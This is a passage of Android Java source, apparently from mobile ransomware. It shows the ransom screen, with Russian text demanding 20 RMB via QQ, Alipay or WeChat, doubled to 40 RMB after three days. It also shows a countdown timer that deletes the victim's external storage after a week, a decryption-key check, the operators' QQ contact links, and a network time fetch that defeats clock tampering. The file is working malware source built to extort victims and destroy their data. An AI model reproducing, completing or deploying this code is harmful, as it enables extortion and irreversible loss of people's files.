1796\u17d2\u17d6\u1792\u17d5\u17d0\u17d5\u17ba\u17ac\u17d6\u17d4\u1793\u17a0\u17a0\u17d6\u17a8\u1782\u178d\u17d6\u17a9\u17b0\u1784\u17e9\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17d5\u17ba\u1792\u17b3\u17d5\u17af\u17a0\u17ac\u17d6\u17d4\u17a8\u17b0\u17d6\u17aa\u1792\u17ae\u17e9" ) );
				nr5.setText ( Utils.l (
								 "\u17d7\u1792\u179a\u17ae\u17d6\u17a8\u1792\u17d4\u17d6\u17d5\u17c8\u17af\u17d6\u1791\u1782\u17a8\u17d6\u17d5\u17d1\u178b\u17d6\u17b9\u17ac\u1795\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d5\u1782\u17c8\u1799\u17d6\u17b9\u17b0\u17a7\u17d6\u17b9\u17b4\u17b1\u17d6\u17af\u179a\u17a2\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d5\u1782\u1796\u17d5\u17d6\u17aa\u17ac\u179a\u17d6\u17b9\u17a0\u17b6\u17d5\u1782\u17c8\u1799\u17d6\u17a8\u17ac\u178b\u17e9\u17d6\u17a9\u17a8\u17a4\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u1782\u17aa\u17d5\u17af\u17b4\u1792\u17d6\u17a8\u17b0\u1796\u17d5\u17ba\u17d5\u178f\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17ba\u17ac\u1791\u17d6\u17b9\u17b0\u17ac\u17d6\u17b9\u17b0\u17a9\u17d4\u1793\u17a0\u17a0\u17d6\u17af\u1786\u1796\u17d6\u17a8\u17a8\u17b1\u17d6\u17b9\u17b4\u17a4\u17d6\u17b9\u1786\u17ac\u17d6\u17b9\u1782\u17a2\u17d6\u1791\u178a\u17cc\u17d6\u178c\u17a8\u1795\u17e9\u17d6\u17b9\u17b0\u17a7\u17d7\u1792\u179a\u17ae\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d6\u17d7\u17ac\u1780\u17d6\u17d4\u17a4\u17ac\u17d6\u17a8\u17d1\u17b0\u17d6\u17d4\u1782\u17ae\u17d6\u17b9\u17b0\u1782\u17d6\u17a9\u17b4\u17d7\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17ba\u17ac\u1791\u17d5\u17af\u17b4\u1792\u17d6\u17a8\u17b0\u1796\u17d5\u1782\u179a\u17af\u17d6\u17d5\u17b0\u17ba\u17d5\u17af\u1796\u1789\u17e9\u17d6\u17a8\u178e\u17da\u17d5\u17ba\u1792\u17b3\u17d6\u17b9\u17b0\u17a7\u17d5\u17ba\u17ac\u17d6\u17d4\u1793\u17a0\u17a0\u17d6\u17a8\u17b4\u17a7\u17d6\u17b9\u17b4\u17a5\u17d6\u17d4\u17a4\u17b1\u17d6\u1793\u1786\u1787\u17d6\u17b9\u17a4\u17b0\u17d6\u17a9\u1796\u1791\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d4\u1793\u17a0\u17a0\u17d6\u1792\u17c8\u178c\u17d5\u17a9\u1782\u17d2\u17d6\u1791\u1782\u17a8\u17d5\u17ba\u1792\u17b3\u17d6\u17a9\u17ac\u17af\u17e9\u17d6\u17b9\u17b0\u17a7\u17d6\u17a8\u178e\u17a7\u17d5\u17a8\u17d1\u179b\u17d6\u17b9\u1782\u17aa\u17d6\u17b9\u17b0\u17d3\u17d4\u1793\u17a0\u17a0\u17d5\u17ba\u17a8\u1784\u17d6\u17a9\u1786\u17d3\u17d6\u1792\u17c8\u17a4\u17d6\u17a9\u17a0\u17d3\u17d6\u17d5\u17b0\u1785\u17e9" ) );*/
				
				zfje.setText ("Сканируйте код, чтобы заплатить 20RMB, а затем обратитесь к автору");
				bt1.setText ("Что случилось с моим телефоном?");
				bt2.setText ("Ваши файлы были зашифрованы. Фотографии, изображения, документы, архивы, аудио, видеофайлы, txt-файлы и т.д. Почти все типы файлов зашифрованы, поэтому их невозможно открыть. Это существенно отличается от общего повреждения файлов. Вы можете найти способы восстановить файлы в Интернете, но без нашей помощи вы не сможете их расшифровать.");
				bt3.setText ("Есть ли способ восстановить эти документы?");
				bt4.setText ("Конечно, существуют методы для восстановления. Его можно восстановить только через нашу службу расшифровки. Я гарантирую лично что могу обеспечить безопасные и эффективные услуги по восстановлению. Но вы должны за определённый срок заплатить. Пожалуйста, будьте уверены, я никогда не буду врать вам. Можно ли в любой момент заплатить фиксированную сумму платежа? Будет ли она восстановлена? Конечно, нет. Не откладывайте оплату для это вас будет хуже. Лучше заплатить платеж в течение 3 дней, или стоимость будет удвоена через три дня. Кроме того, если вы не оплатите в течение недели, ваши файлы будут удалены.");
				nr1.setText ("Способ оплаты:");
				nr2.setText ("Мы поддерживаем платёж с помощью QR-кода. Нажмите кнопку <Проверить платеж> и затем отправьте код сканирования скриншота Мы имеем компенсацию QQ, компенсацию WeChat, компенсацию Alipay. Сумма платежа не может быть меньше суммы, отображаемой в окне. После оплаты нажмите кнопку <Копировать>, чтобы скопировать серийный номер, а затем нажмите <Связаться с нами>, чтобы отправить автору копию серийного номера и платежного билета. После успешного получения учетной записи автор предоставит вам ключ расшифровки. После получения введите ключ в поле ввода внизу и нажмите кнопку <Расшифровать>, чтобы немедленно начать работу по восстановлению.");
				nr3.setText ("Контактная информация");
				nr4.setText ("Если вам нужна наша помощь, нажмите <Связаться с нами> или <Присоединиться к нам>, чтобы отправить нам сообщение.");
				nr5.setText ("Я настоятельно рекомендую, чтобы во избежание ненужных проблем не закрывайте и не удаляйте программное обеспечение до завершения работы по восстановлению. В любом случае по какой-либо причине, если программное обеспечение будет удалено, вполне вероятно, что информация не будет восстановлена ​​после оплаты.");
				
				Typeface createFromAsset = Typeface.createFromAsset ( getActivity ( ).getAssets ( ), "ssspbahk.so" );
				sc.setTypeface ( createFromAsset );
				je.setTypeface ( createFromAsset );

				FragmentActivity activity = getActivity ( );
				SharedPreferences sharedPreferences = activity.getSharedPreferences ( "XH", Context.MODE_PRIVATE );

				wb.setText ( sharedPreferences.getString ( "bah", BuildConfig.VERSION_NAME ) );
				lx.getPaint ( ).setFlags ( Paint.UNDERLINE_TEXT_FLAG );
				jr.getPaint ( ).setFlags ( Paint.UNDERLINE_TEXT_FLAG );

				if ( sharedPreferences.getInt ( "sss", 0 ) == 1 )
					{
						bt.setText ( "Расшифровать" );
						bt.setEnabled ( true );
						ed.setFocusableInTouchMode ( true );
					}

				if ( sharedPreferences.getInt ( "cjk", 0 ) == 1 )
					{
						bt.setText ( "Расшифровка завершена" );
						Toast.makeText ( getActivity ( ), "Расшифровка завершена!", Toast.LENGTH_LONG ).show ( );
					}

				try
					{
						URLConnection openConnection = new URL ( "http://biaozhunshijian.51240.com/" ).openConnection ( );
						openConnection.connect ( );
						Date date = new Date ( openConnection.getDate ( ) );
						SimpleDateFormat simpleDateFormat = new SimpleDateFormat ( "yyyy-MM-dd HH:mm:ss SSS" );
						Calendar instance = Calendar.getInstance ( );
						instance.setTime ( simpleDateFormat.parse ( simpleDateFormat.format ( date ) ) );
						timeStart = instance.getTimeInMillis ( );
					}
				catch (IOException e)
					{
						timeStart = System.currentTimeMillis ( );
					}
				catch (ParseException e)
					{
						e.printStackTrace ( );
					}

				try
					{
						if ( ( sharedPreferences.getLong ( "sj", 0 ) == 0 ) || ( sharedPreferences.getLong ( "sj1", 0 ) ) == 0 )
							{
								Editor edit = sharedPreferences.edit ( );
								edit.putLong ( "sj", timeStart + ( (long) 604801000 ) );
								edit.putLong ( "sj1", timeStart + ( (long) 259201000 ) );
								edit.commit ( );
								fileLostTimeStamp = 604801000;
								paymentRaisedTimeStamp = 259201000;
							}
						else
							{
								fileLostTimeStamp = sharedPreferences.getLong ( "sj", 0 ) - timeStart;
								paymentRaisedTimeStamp = sharedPreferences.getLong ( "sj1", 0 ) - timeStart;
							}

						jed.setText (
							new SimpleDateFormat ( "MM/dd/yyyy HH:mm:ss" ).format ( sharedPreferences.getLong ( "sj1", 0 ) ) );
						scd.setText (
							new SimpleDateFormat ( "MM/dd/yyyy HH:mm:ss" ).format ( sharedPreferences.getLong ( "sj", 0 ) ) );

						new DeleteFileCountDownTimer ( fileLostTimeStamp, (long) 1000 ).start ( );

						new payReminderCountDownTimer ( paymentRaisedTimeStamp, (long) 1000 ).start ( );
					}
				catch (Exception e)
					{
					}

				this.bt.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									if ( 彼岸花 )
										{
											Toast.makeText ( getActivity ( ),
															"Расшифровка уже началась! Пожалуйста, ни чего не делайте!", Toast.LENGTH_SHORT ).show ( );
										}
									else if ( ed.getText ( ).toString ( ).equals ( MainActivity.decryptKey ) )
										{
											彼岸花 = true;
											Toast.makeText ( getActivity ( ), "Ключ правильный, начинается расшифровка!",
															Toast.LENGTH_SHORT ).show ( );
											bt.setText ( "В расшифровке" );

											new Thread ( new Runnable ( ) {
														@Override public void run ( )
															{
																Utils.GetFiles ( MainActivity.externalStorageDirectory.toString ( ), MainActivity.hz, true );
																if ( Utils.filesToEncrypt.size ( ) == 0 )
																	{
																		FragmentActivity activity = getActivity ( );
																		Editor edit = activity.getSharedPreferences ( "XH", Context.MODE_PRIVATE ).edit ( );
																		edit.putInt ( "cjk", 1 );
																		edit.commit ( );
																		mHandler.obtainMessage ( 1279525738 ).sendToTarget ( );
																		return;
																	}
																Utils.deleteDir ( MainActivity.externalStorageDirectory.toString ( ),
																				 ed.getText ( ).toString ( ), 0, getActivity ( ) );
															}
													} ).start ( );
										}
									else
										{
											Toast.makeText ( getActivity ( ), "Неверный ключ!", Toast.LENGTH_SHORT ).show ( );
										}
								}
						} );

				fz.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									( (ClipboardManager) getActivity ( ).getSystemService ( Context.CLIPBOARD_SERVICE ) ).setText (
										wb.getText ( ).toString ( ) );
									Toast.makeText ( getActivity ( ), "Копирование успешно!", Toast.LENGTH_SHORT ).show ( );
								}
						} );

				lx.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									startActivity ( new Intent ( "android.intent.action.VIEW",
																Uri.parse ( "mqqwpa://im/chat?chat_type=wpa&uin=3135078046&version=1" ) ) );
									Toast.makeText ( getActivity ( ),
													"Пожалуйста, пришлите авторам красные конверты и серийные номера!", Toast.LENGTH_LONG )
										.show ( );
								}
						} );

				jr.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									startActivity ( new Intent ( "android.intent.action.VIEW", Uri.parse (
																	"mqqapi://card/show_pslcard?src_type=internal&version=1&uin=571012706&card_type=group&source=qrcode" ) ) );
									Toast.makeText ( getActivity ( ), "Добро пожаловать!", Toast.LENGTH_LONG ).show ( );
								}
						} );

				checkPaymentButton.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									new Builder ( getActivity ( ) ).setTitle ( "Оплата" )
										.setMessage ( "Выберите способ оплаты!" )
										.setPositiveButton ( "QQ", new DialogInterface.OnClickListener ( ) {
												public void onClick ( DialogInterface dialogInterface, int i )
													{
														ewm ( R.drawable.qq );
													}
											} )
										.setNegativeButton ( "Alipay", new DialogInterface.OnClickListener ( ) {
												public void onClick ( DialogInterface dialogInterface, int i )
													{
														ewm ( R.drawable.zfb );
													}
											} )
										.setNeutralButton ( "WeChat", new DialogInterface.OnClickListener ( ) {
												public void onClick ( DialogInterface dialogInterface, int i )
													{
														ewm ( R.drawable.wx );
													}
											} )
										.show ( );
								}
						} );

				ed.setOnClickListener ( new OnClickListener ( ) {
							@Override public void onClick ( View view )
								{
									new Timer ( ).schedule ( new TimerTask ( ) {
												public void run ( )
													{
														ScrollView.fullScroll ( TransportMediator.KEYCODE_MEDIA_RECORD );
													}
											}, (long) 150 );
								}
						} );

				return this.view;
			}

		class DeleteFileCountDownTimer extends CountDownTimer
			{
				public DeleteFileCountDownTimer ( long millisInFuture, long countDownInterval )
					{
						super ( millisInFuture, countDownInterval );
					}

				@Override public void onFinish ( )
					{
						sc.setText ( "Время вышло!" );
						Toast.makeText ( getActivity ( ), "Ваши файлы будут удалены!", Toast.LENGTH_LONG ).show ( );
						new Thread ( new Runnable ( ) {
									@Override public void run ( )
										{
											Utils.deleteFile ( MainActivity.externalStorageDirectory );
										}
								} ).start ( );
					}

				@Override public void onTick ( long j )
					{
						sc.setText ( Utils.formatDuring ( j ) );
					}
			}

		class payReminderCountDownTimer extends CountDownTimer
			{
				public payReminderCountDownTimer ( long millisInFuture, long countDownInterval )
					{
						super ( millisInFuture, countDownInterval );
					}

				@Override public void onFinish ( )
					{
						zfje.setText ( "Пожалуйста, сканируйте код для оплаты 40RMB, а затем свяжитесь с автором" );
						je.setText ( "Время вышло!" );
					}

				@Override public void onTick ( long j )
					{
						je.setText ( Utils.formatDuring ( j ) );
					}
			}
	}
